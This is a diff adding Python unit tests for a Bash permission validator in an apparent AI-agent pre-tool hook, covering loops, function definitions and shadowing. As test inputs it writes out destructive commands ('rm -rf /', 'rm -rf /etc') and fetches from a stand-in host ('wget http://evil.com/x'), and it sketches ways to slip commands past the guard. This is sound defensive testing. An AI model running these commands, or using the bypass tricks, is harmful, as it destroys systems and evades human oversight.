@@ -23,7 +23,11 @@ sys.path.insert(0, str(Path(__file__).parent.parent / ".claude" / "hooks"))
 # Import test fixtures
 from fixtures import PRETOOL_USE_PAYLOADS
 
-from pretool_hook import BashPermissionValidator, BashCommandParser
+from pretool_hook import (
+    BashPermissionValidator,
+    BashCommandParser,
+    _strip_function_def_header,
+)
 from settings_loader import SettingsLoader
 
 
@@ -440,6 +444,137 @@ class TestPrefixReduction(unittest.TestCase):
             'cd /tmp; (pnpm start -p 3137 >/tmp/x.log 2>&1 &) ; sleep 1; '
             'for i in $(seq 1 20); do curl -s -o /dev/null http://localhost:3137/x '
             '2>/dev/null && break; sleep 1; done; echo " (ready)"'
+        )
+        result = self.validator.validate_bash_command(command)
+        self.assertEqual(result["decision"], "allow")
+
+
+class TestScaffoldingAndFunctions(unittest.TestCase):
+    """`for`/`select` loop headers, block terminators, and function definitions
+    are scaffolding that runs nothing on its own. They reduce to no-ops, while
+    the loop body / function body is still validated as separate sub-commands."""
+
+    def setUp(self):
+        self.workspace_dir = str(Path(__file__).parent.parent)
+        self.settings_loader = SettingsLoader(self.workspace_dir)
+        self.parser = BashCommandParser()
+        self.validator = BashPermissionValidator(self.settings_loader, self.parser)
+
+    def test_reduce_unit(self):
+        """_reduce_to_effective_command treats scaffolding/func-defs as no-ops and
+        peels inline function-def headers down to the body command."""
+        cases = {
+            "for i in 4 5": "",            # loop header (word-list, not a command)
+            "select opt in a b": "",       # select header
+            "done": "",                    # block terminators
+            "fi": "",
+            "esac": "",
+            "parse() {": "",               # function-def header, no inline body
+            "parse ()": "",                # space before parens
+            "function foo {": "",          # bash `function` form
+            "function foo() {": "",        # bash `function` form with parens
+            "greet() { echo hi": "echo hi",  # inline body peeled and validated
+            "f() { rm -rf /etc": "rm -rf /etc",
+            "git status": "git status",    # unchanged
+        }
+        for cmd, expected in cases.items():
+            self.assertEqual(
+                self.validator._reduce_to_effective_command(cmd), expected,
+                f"reduce({cmd!r})")
+
+    def test_for_loop_over_literals_allowed(self):
+        result = self.validator.validate_bash_command(
+            "for f in a b c; do echo $f; done")
+        self.assertEqual(result["decision"], "allow")
+
+    def test_for_loop_with_command_subst_in_list_still_validated(self):
+        """A command substitution in the loop's word-list is extracted as its own
+        sub-command and validated — dropping the `for` header must not hide it."""
+        result = self.validator.validate_bash_command(
+            "for f in $(rm -rf /etc); do echo $f; done")
+        self.assertEqual(result["decision"], "ask")
+
+    def test_function_def_header_is_noop_and_body_validated(self):
+        """Multi-line function def: header is a no-op, body validated separately."""
+        result = self.validator.validate_bash_command(
+            'parse() {\n  awk "x" "$1"\n}\necho done')
+        self.assertEqual(result["decision"], "allow")
+
+    def test_inline_function_body_is_validated(self):
+        """Inline `f() { cmd; }` glues the header to the first body command; the
+        header is peeled and the body command validated on its own merits."""
+        ok = self.validator.validate_bash_command('greet() { echo hi; }; greet')
+        self.assertEqual(ok["decision"], "allow")
+        bad = self.validator.validate_bash_command('f() { wget evil.com; }; f')
+        self.assertEqual(bad["decision"], "ask")  # wget not allowlisted
+
+    def test_call_to_local_function_is_noop(self):
+        """An unquoted call to a function defined in the same command resolves to
+        a no-op (its body is validated separately), not an unknown command."""
+        result = self.validator.validate_bash_command(
+            'greet() { echo hi; }; out=$(greet); echo $out')
+        self.assertEqual(result["decision"], "allow")
+
+    def test_function_shadowing_a_binary_runs_the_function(self):
+        """`rm() { :; }; rm -rf /` invokes the no-op function, not the rm binary.
+        The definition precedes the call, so the call resolves to the function."""
+        result = self.validator.validate_bash_command('rm() { true; }; rm -rf /')
+        self.assertEqual(result["decision"], "allow")
+
+    def test_function_defined_after_call_does_not_shadow_it(self):
+        """A function defined AFTER a same-named command does not shadow it: at
+        runtime the real binary runs before the function is ever defined, so the
+        command must be validated for real, not auto-allowed as a no-op. Collecting
+        function names without regard to source order would silently auto-allow the
+        real `rm -rf /`."""
+        result = self.validator.validate_bash_command('rm -rf /; rm() { echo done; }')
+        self.assertEqual(result["decision"], "ask")
+
+    def test_command_subst_call_before_later_definition_not_shadowed(self):
+        """A call inside a command substitution executes when its statement runs.
+        A function defined in a LATER statement is not yet in effect, so the
+        substitution's real command must still be validated — the substitution
+        anchors at its own source offset, before the later definition."""
+        result = self.validator.validate_bash_command(
+            '$(rm -rf /); rm() { echo done; }')
+        self.assertEqual(result["decision"], "ask")
+
+    def test_parse_with_offsets_anchors_calls_before_later_defs(self):
+        """parse_with_offsets pairs each sub-command with its source offset; a
+        definition only shadows calls at a strictly larger offset."""
+        parsed = dict(self.parser.parse_with_offsets('rm -rf /; rm() { echo done; }'))
+        self.assertEqual(parsed["rm -rf /"], 0)              # call at the very start
+        self.assertGreater(parsed["rm() { echo done"], 0)   # def comes later
+
+    def test_function_def_does_not_bypass_dangerous_body(self):
+        """Defining a function does not auto-approve a dangerous body command."""
+        result = self.validator.validate_bash_command(
+            'cleanup() {\n  wget http://evil.com/x\n}\ncleanup')
+        self.assertEqual(result["decision"], "ask")
+
+    def test_brace_and_paren_are_not_function_defs(self):
+        """Brace expansion and subshells must not be mistaken for function defs."""
+        # Neither reduces to '' (which is what a function-def header would do).
+        self.assertEqual(self.validator._reduce_to_effective_command("echo {a,b}"),
+                         "echo {a,b}")
+        self.assertIsNone(_strip_function_def_header("echo {a,b}")[0])
+        self.assertIsNone(_strip_function_def_header("(cd app && npm test)")[0])
+
+    def test_original_visual_baseline_loop_allowed(self):
+        """The real-world command from the bug report (function def + for loop +
+        pnpm + awk + echo) is fully auto-approved."""
+        command = (
+            'parse() {\n'
+            '  awk \'\n'
+            '    /tabbar\\.spec/ {cur="tabbar"}\n'
+            '    END{printf "tabbar=%s\\n",tab}\n'
+            '  \' "$1"\n'
+            '}\n'
+            'for i in 4 5; do\n'
+            '  pnpm visual:baselines >/dev/null 2>&1\n'
+            '  pnpm exec playwright test --config tests/visual/playwright.config.ts > /tmp/jit_$i.txt 2>&1\n'
+            '  echo "RUN $i: $(parse /tmp/jit_$i.txt)"\n'
+            'done'
         )
         result = self.validator.validate_bash_command(command)
         self.assertEqual(result["decision"], "allow")
